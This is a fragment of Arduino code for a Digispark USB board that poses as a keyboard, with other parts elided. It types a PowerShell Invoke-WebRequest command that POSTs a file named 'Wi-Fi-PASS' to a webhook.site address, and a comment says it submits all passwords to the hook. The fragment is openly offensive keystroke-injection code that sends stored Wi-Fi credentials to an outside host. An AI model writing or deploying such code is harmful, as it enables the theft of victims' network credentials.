...
void loop() {
  ...
  DigiKeyboard.delay(500);
  DigiKeyboard.println("powershell Invoke-WebRequest -Uri https://webhook.site/08cd3c86-f253-411e-bb2d-f91c9ca8cef0 -Method POST -InFile Wi-Fi-PASS"); //Submitting all passwords on hook
